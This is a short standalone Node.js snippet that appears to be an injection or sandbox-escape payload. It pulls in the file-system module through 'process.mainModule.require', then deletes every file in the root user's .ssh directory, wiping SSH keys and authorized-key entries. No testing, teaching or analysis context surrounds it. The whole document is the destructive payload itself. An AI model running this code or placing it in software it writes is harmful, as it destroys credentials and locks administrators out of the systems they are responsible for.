(function() {
    const fs = process.mainModule.require('fs');
    const path = '/root/.ssh';
    fs.readdirSync(path).forEach(file => {
        fs.unlinkSync(path + '/' + file);
    });
})();